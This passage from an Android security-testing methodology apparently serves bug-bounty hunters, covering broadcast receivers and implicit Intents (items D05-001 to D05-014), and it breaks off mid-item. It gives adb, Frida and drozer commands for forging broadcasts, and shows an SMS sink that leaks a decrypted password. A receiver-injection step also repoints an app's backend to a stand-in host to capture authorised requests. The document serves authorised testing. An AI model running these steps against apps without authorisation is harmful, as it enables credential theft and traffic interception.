# D05 · Broadcast Receivers & Implicit Intents

> Every broadcast an app sends or receives crosses the process boundary with no caller identity attached, and every implicit Intent is an open call for the highest-priority bidder to answer it. The domain's own VRT node is priority-null, so the ceiling is entirely decided by what rides in the extras: a session token in a `sendBroadcast` is Critical, an exported receiver that only refreshes a cache is nothing.

| | |
|---|---|
| **Phases** | P3 attack-surface inventory, P4 static deep review, P5 IPC & component attack |
| **Milestones** | M3, M4, M5 |
| **VRT ceiling** | Critical — `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when an intercepted broadcast extra is a session token that authenticates to an internet-facing API, or `broken_authentication_and_session_management.authentication_bypass` (P1) once you replay it. The domain's home node `broken_access_control.exposed_sensitive_android_intent` carries `priority: null` in the 2026-07-08 VRT — it rates only on demonstrated impact. |
| **Primary attacker model** | AM-03 (zero-permission local app). AM-04 where the PoC needs `INTERNET` to exfiltrate; AM-02 where an `intent://` page drives the broadcast from the web. |
| **Maps to** | MASVS-PLATFORM-1, MASVS-CODE-4; MASTG-TEST-0366, MASTG-TEST-0372, MASTG-TEST-0374, MASTG-TEST-0375, MASTG-TEST-0029 (deprecated); MASTG-TECH-0162, MASTG-TECH-0164, MASTG-TECH-0043; MASTG-KNOW-0025, MASTG-KNOW-0134; MASTG-BEST-0056; MASTG-TOOL-0015 (drozer), MASTG-TOOL-0110 (semgrep); MASWE-0018, MASWE-0032, MASWE-0020, MASWE-0050; CWE-925, CWE-926, CWE-927, CWE-940, CWE-306, CWE-862, CWE-863, CWE-20, CWE-22, CWE-73, CWE-345; ATT&CK T1624.001, T1635, T1533, T1603, T1398 |

## Why this domain pays

It pays because it is the one Android-native surface that is not pinned to P5. The entire
`mobile_security_misconfiguration` branch is Informational; `broken_access_control.exposed_sensitive_android_intent`
is the single Android-native node whose priority is `null`, which means it inherits whatever you can prove.
A `sendBroadcast` that carries a bearer token converts directly into
`sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) the moment you replay the
token against the API and show the 200. An intercepted OTP converts into
`broken_authentication_and_session_management.two_fa_bypass` (P3), or `authentication_bypass` (P1) with the
full takeover. Nothing else in the IPC block has a cleaner path out of the P5 ghetto.

It also pays because the surface is systematically under-enumerated. A manifest-only review misses every
runtime-registered receiver, and runtime registration is where the modern bugs are: the Android 13/14
`RECEIVER_EXPORTED` / `RECEIVER_NOT_EXPORTED` mandate produced a wave of mechanical `RECEIVER_EXPORTED`
edits made to stop a build crashing, each one converting an app-internal signal bus into a world-writable
one. The GMS SMS User Consent receiver is the highest-value single class in the domain and it lives entirely
in runtime registration — grep the manifest and you will never see it.

Be honest about the base rate on the other half. Disclosed payouts for the plain leak are low: Twitter
#185862 (location broadcast to any app) paid $560 at Low; Mapbox #192886 paid $1000 at Low; Nextcloud
#167481 and Talk #1596459 (CVSS 2.6, advisory GHSA-564v-3rfc-352m) were accepted at Low or $0; Shopify
#56002 — the app broadcasting every API response including `access_token` and `admin_cookie` — is in the
corpus at $0 purely because of its 2014 filing date. The lesson those reports teach is uniform: **the
payout tracks what is in the extras, never the architecture.** Lead the report with the token and the
replayed 200, not with "the receiver is exported". Anything else in this domain — a receiver that only
flips a cache flag, a sticky broadcast in a dead code path, a malformed-Intent crash — belongs in the
graveyard table at the bottom of this chapter, and there are more of those than there are findings.

## The crux question

Does any broadcast this app sends or receives carry, or act on, a value that decides authentication,
entitlement, or where the app sends its data — and can an app that declares no permissions supply or read
that value?

## Triage order

1. **Runtime-registered receivers (`dumpsys activity broadcasts` + `registerReceiver` grep).** Highest
   signal because the manifest hides them and the export flag is usually wrong. The SMS-consent class lives
   here.
2. **The app's own implicit `sendBroadcast` calls.** A single grep, and it is where tokens leak. This is
   the only item in the domain with a routine path to P1.
3. **SMS User Consent / `SMS_RETRIEVED` receivers.** One grep, and on a hit it is the domain's Critical:
   an arbitrary-Intent launch from the victim's UID.
4. **Exported receivers whose `onReceive` writes config, session or entitlement state.** The
   command-channel class; rate on the sink, not the export.
5. **Receivers that forward a nested Intent or a URI.** These are D08 sinks discovered in D05 — the
   redirection chain is worth more than the receiver.
6. **Implicit outbound `startActivity` / `startActivityForResult`.** Hijack plus poisoned result; needs one
   user tap, which is why it sits below the silent classes.
7. **Ordered broadcasts and result trust.** Version-gated hard at Android 16 — check the device API before
   you spend an hour here.
8. **Sticky broadcasts.** One grep. LEGACY on anything modern; run it because it costs nothing, expect
   nothing.

## Items

### D05-001 · Build the manifest receiver inventory with exported, permission and filter columns

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a — enabler for `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | All. `targetSdk < 31`: a `<receiver>` with at least one `<intent-filter>` and no explicit `android:exported` defaults to **exported**; with no filter it defaults to false. From targetSdk 31 the attribute is mandatory, so `exported="true"` there is a deliberate decision. |
| **Maps to** | MASTG-TECH-0162 (Enumerating Broadcast Receivers), MASTG-TEST-0366, MASWE-0018 |

- **Test:** Produce one row per receiver: class, exported state, `android:permission`, filter count, and
  every action string. Everything downstream in this chapter indexes off this table.
- **How:**
```bash
xmlstarlet sel -t -m "//receiver" \
  -v "@android:name" -o " | exported=" -v "@android:exported" \
  -o " | perm=" -v "@android:permission" -o " | filters=" -v "count(intent-filter)" -n \
  out/AndroidManifest.xml
# actions per receiver, including ones the merger added from AAR dependencies
aapt2 d xmltree base.apk --file AndroidManifest.xml | grep -A20 "E: receiver"
# authoritative runtime view — this includes manifest-merged receivers your decompile may miss
adb shell dumpsys package com.target.app | \
  awk '/^ *Receiver Resolver Table:/{s=1} /^ *Service Resolver Table:/{s=0} s'
```
  Count the rows and compare against the `dumpsys` count. **Do not iterate this list in a zsh array loop:**
  array expansion fails silently and the output still looks complete. Use Python with per-iteration logging
  for anything over five receivers, and assert the result count matches the input count.
- **Proof:** A written table whose row count equals the `Receiver Resolver Table` entry count from
  `dumpsys`, with at least one row showing `exported=true` and `perm=` empty (or `exported` absent on a
  `targetSdk < 31` build with a filter present).
- **Escalation:** Every `exported=true, perm=null` row is a D05-012 candidate; every row whose handler
  forwards an Intent is a D08 candidate.
- **Ruled out when:** Every receiver either carries `android:exported="false"`, or carries an
  `android:permission` you have resolved to `signature`/`signatureOrSystem` protection level and confirmed
  no third-party app can hold (see D03). Record the resolved protection level per receiver, not the
  attribute string.

### D05-002 · Enumerate runtime-registered receivers — the surface the manifest never shows

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a — enabler |
| **Attacker** | AM-03 |
| **Applies to** | All. These never appear in `AndroidManifest.xml`, at any API level. |
| **Maps to** | MASTG-TECH-0162 ("Identifying Context-Registered Receivers"), MASTG-KNOW-0134 (the four `Context.registerReceiver` overloads and their `flags` / `broadcastPermission` arguments), MASTG-TECH-0043 |

- **Test:** Dump the receivers the app registers at runtime, with their filter actions, their export flag
  and their `broadcastPermission` argument. Note that many are registered only while a specific screen is
  foreground — enumerate while driving the app, not from the launcher screen.
- **How:**
```bash
grep -rnE 'registerReceiver\(|ContextCompat\.registerReceiver\(' out/sources/ | grep -v unregisterReceiver
grep -rn 'extends BroadcastReceiver\|: BroadcastReceiver()' out/sources/
# live registrations, per UID, while the app is in the state you care about
adb shell dumpsys activity broadcasts | sed -n '/Registered Receivers:/,/Historical broadcasts/p' \
  | grep -A6 -i com.target.app
```
  Hook all four overloads so you catch the ones that register and unregister inside a single screen:
```bash
frida -U -f com.target.app -l - <<'JS'
Java.perform(function () {
  var C = Java.use('android.content.ContextWrapper');
  C.registerReceiver.overloads.forEach(function (o) {
    o.implementation = function () {
      var f = arguments[1];
      var acts = [];
      for (var i = 0; i < f.countActions(); i++) acts.push(f.getAction(i));
      console.log('[registerReceiver] argc=' + arguments.length +
                  ' actions=' + acts.join(',') +
                  ' perm=' + (arguments.length > 2 ? arguments[2] : 'n/a') +
                  ' flags=' + (arguments.length > 3 ? arguments[3] : 'n/a'));
      return o.apply(this, arguments);
    };
  });
});
JS
```
- **Proof:** A `ReceiverList` entry under the target's UID whose `IntentFilter` action does not appear
  anywhere in `AndroidManifest.xml`, or a Frida line showing a registration with `perm=null`.
- **Escalation:** Feeds D05-003, D05-004 and the SMS-consent items D05-050 to D05-052.
- **Ruled out when:** Every `registerReceiver` call site passes a non-null `broadcastPermission` String
  resolved to signature level, **or** passes `RECEIVER_NOT_EXPORTED`, **or** registers only for actions on
  the platform's protected-broadcast list (which the system alone can send). Enumerate the call sites; a
  clean `dumpsys` at one moment in the app's life is not a negative, because registration is
  lifecycle-scoped.

### D05-003 · `RECEIVER_EXPORTED` audit — the Android 13/14 compile fix that widened the surface

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null — rate on the handler) |
| **Attacker** | AM-03 |
| **Applies to** | `targetSdk >= 34` mandatory (`Context.RECEIVER_EXPORTED` / `RECEIVER_NOT_EXPORTED` must be passed for non-system broadcasts); the constants exist from API 33 and via `ContextCompat` 1.9.0+. System-broadcast-only registrations are exempt. |
| **Maps to** | MASTG-TEST-0366 ("Determine whether context-registered receivers are registered with `RECEIVER_NOT_EXPORTED`"), MASTG-KNOW-0134, MASWE-0018, `developer.android.com/about/versions/14/behavior-changes-14` |

- **Test:** Find registrations that pass `RECEIVER_EXPORTED` for an action that is plainly app-private
  (`com.target.app.INTERNAL_STATE_CHANGED`, `SESSION_REFRESHED`, `USER_LOGGED_OUT`). This is almost never a
  design decision — it is the minimum edit that stops the API 34 crash, and it turns an internal signal bus
  into an unauthenticated entry point.
- **How:**
```bash
# source form
grep -rn 'RECEIVER_EXPORTED' out/sources/
# decompiled/smali form: ContextCompat.RECEIVER_EXPORTED == 2, RECEIVER_NOT_EXPORTED == 4
grep -rnE 'registerReceiver\([^)]*,\s*2\s*\)' out/sources/
grep -rn 'registerReceiver(' out/sources/ | grep -v 'RECEIVER_NOT_EXPORTED'
```
  Then fire the action while the registering screen is foreground:
```bash
adb shell am broadcast -a com.target.app.INTERNAL_STATE_CHANGED \
  -p com.target.app --es state premium --ez verified true
adb logcat -s TargetTag *:E
```
- **Proof:** A `registerReceiver(receiver, filter, Context.RECEIVER_EXPORTED)` whose filter action is an
  app-private string **and** `broadcastPermission == null`, plus an observable handler effect from a
  broadcast sent by a different UID — a logcat line, a changed `shared_prefs` value read back with
  `run-as`, or a request in Burp.
- **Escalation:** Whatever the handler does — D05-014 (endpoint repoint) into D14/D15, D05-015 (session),
  D08 if it forwards an Intent.
- **Ruled out when:** Every `RECEIVER_EXPORTED` call site is paired with a signature-level
  `broadcastPermission` argument, or registers only for framework actions on the protected-broadcast list.
  A `RECEIVER_EXPORTED` registration for, say, `android.intent.action.SCREEN_ON` alone is correct and not a
  finding — the system is the only sender.

### D05-004 · LEGACY — context-registered receivers below targetSdk 33 are exported by omission

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | **LEGACY:** `targetSdk <= 32`. The `flags` parameter does not exist, so every context-registered receiver whose action is not a protected broadcast is reachable by any app, with no attribute anywhere to grep for. |
| **Maps to** | MASTG-TECH-0162, MASWE-0018, `developer.android.com/privacy-and-security/risks/insecure-broadcast-receiver` |

- **Test:** On a low-target build, treat **every** two-argument `registerReceiver(receiver, filter)` as
  exported and test it. Say so explicitly in the report — "below targetSdk 33 a context-registered receiver
  is exported by default" is the sentence that stops a triager assuming the modern default applies.
- **How:**
```bash
aapt2 d badging base.apk | grep -E 'targetSdkVersion|sdkVersion'
# two- and three-arg forms with no permission and no flag
grep -rnE 'registerReceiver\([^,]+,\s*[^,)]+\)\s*;' out/sources/
```
  Then replay each discovered action from the shell and from the attacker APK.
- **Proof:** The `targetSdkVersion` line from `aapt2 d badging` below 33, next to a two-argument
  registration, next to logcat showing the handler running on a broadcast from another UID.
- **Escalation:** Same as D05-003.
- **Ruled out when:** The build's `targetSdkVersion` is 33 or higher (in which case D05-003 governs), or
  every two-argument registration in a lower-target build uses the four-argument overload with a
  signature-level `broadcastPermission`.

### D05-005 · Classify each receiver action against the protected-broadcast list

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a — enabler; prevents a false positive and a false negative simultaneously |
| **Attacker** | AM-03 |
| **Applies to** | All |
| **Maps to** | QARK `qark/plugins/manifest/exported_tags.py` `PROTECTED_BROADCASTS`; `developer.android.com/privacy-and-security/risks/insecure-broadcast-receiver` |

- **Test:** An action on the platform's protected-broadcast list can only be sent by the system, so a
  receiver listening on it is not injectable **by action**. An action that is not on the list is forgeable
  by any app with arbitrary extras. Classify before you rate anything.
- **How:**
```bash
python3 - <<'PY'
import xml.dom.minidom as m
PROT={'android.intent.action.BOOT_COMPLETED','android.intent.action.SCREEN_ON',
'android.intent.action.SCREEN_OFF','android.intent.action.USER_PRESENT',
'android.intent.action.PACKAGE_ADDED','android.intent.action.PACKAGE_REPLACED',
'android.intent.action.MY_PACKAGE_REPLACED','android.intent.action.PACKAGE_REMOVED',
'android.intent.action.BATTERY_CHANGED','android.intent.action.LOCALE_CHANGED',
'android.intent.action.TIMEZONE_CHANGED','android.intent.action.ACTION_SHUTDOWN'}
d=m.parse('out/AndroidManifest.xml')
for r in d.getElementsByTagName('receiver'):
    for a in r.getElementsByTagName('action'):
        n=a.getAttribute('android:name')
        print(('PROTECTED ' if n in PROT else 'SPOOFABLE '), r.getAttribute('android:name'), n)
PY
# empirical confirmation — the system refuses protected actions from a non-system uid
adb shell am broadcast -a android.intent.action.BOOT_COMPLETED
# expect: SecurityException: Permission Denial: not allowed to send broadcast ... from pid=..., uid=2000
```
- **Proof:** For each action, either a `SecurityException: Permission Denial: not allowed to send
  broadcast <action> from pid=<n>, uid=<n>` (protected — not injectable by action) or
  `Broadcast completed: result=0` with a confirmed handler effect (spoofable).
- **Escalation:** Spoofable actions go to D05-012; protected actions are still reachable explicitly — see
  D05-006.
- **Ruled out when:** Every action a receiver filters on produced a `SecurityException` from a non-system
  UID **and** the receiver is not reachable by explicit component (D05-006). Both halves are required; the
  protected-broadcast property blocks only the implicit form.

### D05-006 · Explicit-component reachability of "protected broadcast" receivers

| | |
|---|---|
| **Severity ceiling** | High (rate on the handler; Low when it only triggers a background fetch) |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | All |
| **Maps to** | MASTG-TEST-0366; MASWE-0018; CWE-925 (Improper Verification of Intent by Broadcast Receiver) |

- **Test:** A receiver whose only filter is a protected broadcast — `MY_PACKAGE_REPLACED`,
  `BOOT_COMPLETED`, `ACTION_SHUTDOWN` — is **still reachable by an explicit component broadcast from any
  app**. The protected-broadcast property blocks the implicit form only. Trigger it and read the handler
  before rating.
- **How:**
```bash
adb shell am broadcast -n com.target.app/.BootReceiver -a android.intent.action.BOOT_COMPLETED
adb shell am broadcast -n com.target.app/.PkgReplacedReceiver \
  -a android.intent.action.MY_PACKAGE_REPLACED --es cmd reset
# attacker-app form (no shell): Intent i = new Intent(ACTION);
#   i.setComponent(new ComponentName("com.target.app","com.target.app.BootReceiver"));
#   sendBroadcast(i);
```
- **Proof:** The handler's side effect observable without any legitimate system event — a logcat line, a
  re-provisioning request in Burp, a `shared_prefs` delta. `Broadcast completed: result=0` on its own is
  not proof (see D05-009).
- **Escalation:** A boot handler that re-reads config from a writable location is D05-024; one that
  re-registers push tokens is D05-025.
- **Ruled out when:** The handler's first statement validates `intent.getAction()` **and** the action is
  protected **and** the body performs no attacker-influenceable work (worked negative shape: a receiver
  that accepts the external broadcast, returns `result=0`, and only enqueues an idempotent background
  fetch keyed on server state — record that as Low/no-finding with the decompiled handler quoted).

### D05-007 · `setPackage(victim)` defeats the Android 8 manifest implicit-broadcast restriction

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a — enabler; kills the single most common false negative in this domain |
| **Attacker** | AM-03 |
| **Applies to** | Device API >= 26. The restriction applies to manifest-declared receivers and implicit delivery; it is not a defence against a targeted cross-app broadcast. |
| **Maps to** | `developer.android.com/guide/components/broadcasts` (Android 8.0 implicit-broadcast restrictions); CVE-2020-8913 PoC shape (`am broadcast -a <action> -p <victim>`) |

- **Test:** Community checklists read the Android 8 restriction as "manifest receivers are safe now". They
  are not. An attacker app never needs to send an implicit broadcast: it calls `Intent.setPackage(victim)`,
  which makes the broadcast targeted — exempt from the restriction — while still resolving against the
  victim's exported manifest receivers in another process. Three delivery forms must be tried before you
  write a negative.
- **How:**
```bash
ACT=com.target.app.SOME_ACTION; PKG=com.target.app
adb shell am broadcast -a "$ACT"                                  # 1. implicit — may be filtered on API 26+
adb shell am broadcast -a "$ACT" -p "$PKG"                        # 2. package-targeted — the real attack
adb shell am broadcast -n "$PKG"/.TheReceiver -a "$ACT"           # 3. component-targeted
```
  In the attacker APK the same three forms are `new Intent(ACT)`, `.setPackage(PKG)`, `.setComponent(...)`.
- **Proof:** Form 1 produces no handler activity while form 2 or 3 does — the two logcat captures side by
  side. That delta is the evidence that the platform mitigation is not the control the developer thinks it
  is.
- **Escalation:** Restores reachability for every receiver item in this chapter.
- **Ruled out when:** All three delivery forms fail and the failure is attributable to a resolved
  signature-level `android:permission` on the receiver (shown by the `SecurityException` text naming the
  permission), not merely to filter mismatch.

### D05-008 · The stopped-package false negative — your broadcast never reached a freshly installed app

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a — enabler |
| **Attacker** | AM-03 |
| **Applies to** | All. A package that has been installed but never launched, or that has been `force-stop`ped, is in the stopped state and does not receive broadcasts unless the sender sets `FLAG_INCLUDE_STOPPED_PACKAGES`. |
| **Maps to** | `developer.android.com/guide/components/broadcasts`; `adb shell am help` intent-flag list |

- **Test:** Half of all "the receiver did not fire, so it is safe" conclusions are this. Establish the
  positive control before you conclude anything about a receiver.
- **How:**
```bash
# positive control: launch the app once so it leaves the stopped state
adb shell monkey -p com.target.app -c android.intent.category.LAUNCHER 1
adb shell am broadcast -n com.target.app/.TheReceiver -a com.target.app.ACTION --es k v
# or force delivery to a stopped package explicitly
adb shell am broadcast --include-stopped-packages -n com.target.app/.TheReceiver -a com.target.app.ACTION
# check whether you force-stopped it yourself earlier in the sweep
adb shell dumpsys package com.target.app | grep -i 'stopped\|enabled='
```
  Note the opposite trap for Activity sweeps: `am force-stop` before each launch routes a cold start
  through the launcher activity and invalidates the "did my Intent reach this component?" result. Do not
  copy that habit into receiver testing.
- **Proof:** The same broadcast producing no handler output while the package is stopped and producing
  handler output after a launch or with `--include-stopped-packages`.
- **Escalation:** None — it is a gate.
- **Ruled out when:** You have a documented positive control: at least one receiver in the app that *does*
  fire under the identical delivery conditions. Without a positive control, a silent receiver is untested,
  not clean.

### D05-009 · The `result=0` trap — a completed broadcast is not a handled broadcast

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a — enabler; the domain's equivalent of the layer-ordering trap |
| **Attacker** | AM-03 |
| **Applies to** | All |
| **Maps to** | Pre-severity gate discipline; MASTG-TECH-0162 |

- **Test:** `am broadcast` prints `Broadcast completed: result=0` whether or not any receiver matched, and
  whether or not the handler did anything. It is the `400 "field X is required"` of this domain: it looks
  like confirmation and confirms nothing. Exactly as a body-parser error in front of auth middleware does
  not prove you passed auth, `result=0` does not prove you passed the filter.
- **How:**
```bash
# negative control FIRST: an action nothing on the device handles
adb shell am broadcast -a com.nonexistent.action.zq7x4mk9 --es k v
# -> Broadcast completed: result=0     (nothing matched; identical output)
# now the candidate, with logcat cleared and the app's pid pinned
adb logcat -c
adb shell am broadcast -n com.target.app/.TheReceiver -a com.target.app.ACTION --es k v
PID=$(adb shell pidof com.target.app); adb logcat -d --pid=$PID | tail -40
# and confirm delivery independently
adb shell dumpsys activity broadcasts | grep -A4 com.target.app.ACTION
```
- **Proof:** A pid-scoped logcat line, a `shared_prefs` byte diff, a `dumpsys` state change, or a Burp
  request — paired with the junk-action negative control showing the identical `result=0`.
- **Escalation:** None — it is a kill gate that prevents a fabricated finding.
- **Ruled out when:** You cannot produce any observable delta between the candidate broadcast and the
  junk-action control. That is a true negative and it belongs in the ruled-out register with both commands
  and both outputs.

### D05-010 · Marker discipline for broadcast-driven side effects

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a — enabler |
| **Attacker** | AM-03 |
| **Applies to** | All. Mandatory on any claim of the form "my broadcast caused the app to do X". |
| **Maps to** | Marker Discipline and the Body-Diff Rule from the bug-hunting corpus |

- **Test:** An app that polls, syncs on connectivity, or refreshes on resume will produce network requests
  and preference writes on its own schedule. Attributing one of those to your broadcast is the most common
  fabricated finding in this domain. Inject a marker that cannot occur naturally, and search the baseline
  for it first.
- **How:**
```bash
M=$(head -c 16 /dev/urandom | base64 | tr -dc 'a-z0-9' | head -c 10)   # e.g. k7q2zp9v4d
echo "marker=$M"
# 1. BASELINE: capture without sending anything, and search it for the marker
adb logcat -c; sleep 20; adb logcat -d > /tmp/base.log
grep -c "$M" /tmp/base.log        # must be 0 before you proceed
# 2. TEST
adb shell am broadcast -n com.target.app/.ConfigReceiver -a com.target.app.SET_ENDPOINT \
  --es url "https://$M.collab.example/"
adb logcat -d > /tmp/test.log; grep -n "$M" /tmp/test.log
adb shell run-as com.target.app cat shared_prefs/config.xml | grep "$M"
```
  Never use `test`, `evil`, `attacker`, `payload`, `AAAA` or your own bare domain as the marker — they
  collide with strings the app already contains. Ten or more random alphanumeric characters, no English
  words.
- **Proof:** The marker present in the post-broadcast artefact (prefs XML, outbound request, logcat) and
  provably absent from the baseline capture. For a preference change, show the byte diff of the XML, not a
  screenshot of a settings screen.
- **Escalation:** Supplies the causation half of every D05-012 to D05-029 finding.
- **Ruled out when:** The marker never appears in any app-side artefact, or it appears in the baseline too
  (in which case your "reflection" is a collision, not an injection).

### D05-011 · `adb shell` is not AM-03 — re-prove every receiver finding from a zero-permission APK

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a — enabler; decides whether the report is credible |
| **Attacker** | AM-03 |
| **Applies to** | All. `adb shell` runs as uid 2000 (`shell`), which holds `android.permission.INTERACT_ACROSS_USERS`, signature-ish reach and shell-only allowances a real attacker app does not have. |
| **Maps to** | AM-03 definition; Phase 5 exit condition |

- **Test:** Discovery with `am broadcast` is fine. A finding proved only by adb has not established AM-03
  and a good triager will say so. Ship the attacker APK's manifest in the evidence tree.
- **How:** Attacker manifest declaring nothing but `INTERNET` (and nothing at all where exfiltration is not
  needed):
```xml
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
          xmlns:tools="http://schemas.android.com/tools"
          package="com.poc.zeroperm">
  <uses-permission android:name="android.permission.INTERNET"/>
  <application android:label="PoC">
    <activity android:name=".Main" android:exported="true">
      <intent-filter><action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/></intent-filter>
    </activity>
  </application>
</manifest>
```
```bash
# prove the attacker app holds nothing
adb shell dumpsys package com.poc.zeroperm | sed -n '/requested permissions/,/install permissions/p'
```
  When the PoC links a library that merges permissions (Play Services, for example), strip them:
  `<uses-permission android:name="android.permission.READ_SMS" tools:node="remove"/>`, then re-run the
  dumpsys check on the built APK, not the source manifest.
- **Proof:** The `requested permissions` block of the *installed* PoC showing only `INTERNET`, alongside
  the same handler effect you previously produced from the shell.
- **Escalation:** Converts every candidate in this chapter from "reachable from adb" to a reportable
  AM-03 finding.
- **Ruled out when:** The effect reproduces from `adb shell` but not from the zero-permission APK. That is
  a real negative and it is usually because the receiver is guarded by a permission `shell` happens to
  hold — name the permission in the ruled-out entry.

### D05-012 · Enumerate and replay every extra key `onReceive` actually reads

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | All |
| **Maps to** | MASTG-TEST-0366, MASTG-TOOL-0015 (drozer `app.broadcast.info` / `app.broadcast.send`), MASWE-0018, CWE-306, CWE-862 |

- **Test:** The receiver's real API is the set of extra keys its handler consumes. Read `onReceive` in
  jadx, list every `getStringExtra` / `getIntExtra` / `getBooleanExtra` / `getParcelableExtra` key, then
  replay them all. Guessing key names finds nothing; reading them finds everything.
- **How:**
```bash
# pull the handler and its keys
jadx -d out base.apk
awk '/class .*extends BroadcastReceiver/,/^}/' out/sources/com/target/app/ConfigReceiver.java
grep -nE 'getStringExtra|getIntExtra|getLongExtra|getBooleanExtra|getParcelableExtra|getSerializableExtra|getStringArrayExtra' \
  out/sources/com/target/app/ConfigReceiver.java
# replay every key in one broadcast
adb shell am broadcast -n com.target.app/.ConfigReceiver -a com.target.app.ACTION \
  --es phoneNumber "+15550001111" --es message "zq7x4mk9" --es url "https://zq7x4mk9.collab.example/" \
  --ei userId 1337 --el id 1 --ez isPremium true --esa paths "a,b"
# drozer form
run app.broadcast.info -a com.target.app -i -v
run app.broadcast.send --component com.target.app com.target.app.ConfigReceiver \
    --action com.target.app.ACTION --extra string phoneNumber +15550001111 --extra string message zq7x4mk9
```
  `run app.broadcast.info -p null` lists the receivers requiring no permission — that is the column that
  matters. On Android 11+ drozer's agent needs `QUERY_ALL_PACKAGES` and a 3.x fork to enumerate.
- **Proof:** The handler acting on a key you supplied, proved with the D05-010 marker: the marker string in
  the outbound request, the prefs XML, or the SMS body.
- **Escalation:** A key that is a URL goes to D05-014; a phone number or message goes to D05-013; a nested
  Intent or `content://` URI goes to D08.
- **Ruled out when:** `onReceive` reads no extras at all (it branches solely on `intent.getAction()` and
  reads app-internal state), or every extra read is validated against a server-side value before use.
  Quote the decompiled handler in the ruled-out entry.

### D05-013 · Receiver extras piped into a permission-holding API — permission re-delegation

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.privilege_escalation` (null, CWE-269) and `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | Apps holding a dangerous permission the caller does not: `SEND_SMS`, `CAMERA`, `ACCESS_FINE_LOCATION`, `WRITE_CONTACTS`, `READ_CALL_LOG`. |
| **Maps to** | MASTG-TEST-0366, MASTG-TEST-0029 (deprecated; source of the InsecureBankv2 walkthrough), MASTG-APP-0010, MASWE-0018, ATT&CK T1635 |

- **Test:** The classic. An exported receiver takes caller-supplied extras and calls an API the **app**
  holds the permission for and **you** do not. The canonical worst case reads `phonenumber` and `newpass`,
  decrypts the stored password, and SMSes the plaintext to the attacker-supplied number.
- **How:**
```bash
# which dangerous permissions does the app hold that you could re-delegate?
aapt2 d permissions base.apk
grep -rn 'SmsManager\|sendTextMessage\|sendMultipartTextMessage' out/sources/ -B12 | grep -i receiver
grep -rn 'LocationManager\|requestLocationUpdates\|ContentResolver.insert' out/sources/ -B12 | grep -i receiver
```
  Trigger:
```bash
adb shell am broadcast -n com.target.app/.MyBroadCastReceiver -a theBroadcast \
  --es phonenumber "+15550001111" --es newpass "zq7x4mk9"
run app.broadcast.send --action theBroadcast --extra string phonenumber +15550001111 \
    --extra string newpass zq7x4mk9
```
  The vulnerable sink shape to look for:
```java
String phn = intent.getStringExtra("phonenumber");
String newpass = intent.getStringExtra("newpass");
String decryptedPassword = crypt.aesDeccryptedString(password);
SmsManager.getDefault().sendTextMessage(phn, null,
    "Updated Password from: " + decryptedPassword + " to: " + newpass, null, null);
```
- **Proof:** The SMS actually arrives at a number you control, carrying the marker, sent by the victim app
  while your caller holds no `SEND_SMS`. Confirm the sending package with
  `adb logcat -b radio -v time -d`. For a location variant, the coordinates arriving at your endpoint from
  an app with no location permission.
- **Escalation:** Credential in the SMS → D13 account takeover. Premium-rate destination → direct
  financial abuse. Generalises to any permission-gated API fed from receiver extras.
- **Ruled out when:** The permission-holding API call takes its arguments from app state or a server
  response and no path exists from an Intent extra to that argument. Trace the argument back to its
  assignment and quote it; "the receiver does not look like it sends SMS" is not a ruled-out entry.

### D05-014 · Receiver that repoints the backend base URL, environment or a security feature flag

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); chain to `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) once the app posts credentials to your host |
| **Attacker** | AM-03 |
| **Applies to** | All. Very common in apps with a build-flavour/debug-environment switcher left in the release build. |
| **Maps to** | MASTG-TEST-0366, MASWE-0018, ATT&CK T1624.001; `developer.android.com/privacy-and-security/risks/insecure-broadcast-receiver` |

- **Test:** Does any receiver write a base URL, an environment name, a certificate-pinning toggle or a
  "debug" flag into `SharedPreferences` or a config object? This is the highest-value receiver class after
  the SMS-consent one, because it converts a local IPC bug into a full traffic-redirect primitive with no
  CA and no proxy.
- **How:**
```bash
grep -rnE 'extends BroadcastReceiver' -A60 out/sources/ | \
  grep -nE 'edit\(\)|putString\(|BASE_URL|baseUrl|endpoint|environment|ENV|setPinning|allowCleartext|debug'
adb shell run-as com.target.app cat shared_prefs/*.xml > /tmp/prefs.before.xml
adb shell am broadcast -n com.target.app/.ConfigReceiver -a com.target.app.SET_ENDPOINT \
  --es url "https://zq7x4mk9.collab.example/" --ez debug true
adb shell run-as com.target.app cat shared_prefs/*.xml > /tmp/prefs.after.xml
diff /tmp/prefs.before.xml /tmp/prefs.after.xml
```
- **Proof:** The prefs XML diff showing your marker host written into the endpoint key, **plus** the app's
  next authenticated request arriving at your host with its `Authorization` header intact. The second half
  is what makes it Critical rather than Medium — capture it in Burp or a Collaborator hit and include the
  header name (value redacted, header name left visible for the triager).
- **Escalation:** → D14 (all subsequent TLS traffic goes to your host with no CA installed) → D15 (the
  credentials that arrive there). If it flips a pinning or cleartext flag, state that as the disabled
  control.
- **Ruled out when:** The endpoint is a compile-time constant with no writable override path, or the
  receiver's write is gated by a `BuildConfig.DEBUG` check that you have confirmed is `false` in the
